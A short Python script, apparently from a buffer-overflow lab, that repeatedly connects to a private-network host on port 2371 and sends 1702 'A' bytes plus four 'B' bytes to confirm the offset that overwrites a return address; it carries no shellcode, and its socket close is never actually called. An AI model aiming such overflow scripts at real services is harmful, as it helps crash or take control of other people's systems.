#!/usr/bin/python
import sys , socket
from time import sleep


IP='192.168.1.4'
port=2371

buffer ='A' * 1702 + 'B' * 4


while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((IP , port))
        
        s.send((buffer))
        s.close
        sleep(1)
        
    except:
        
        sys.exit()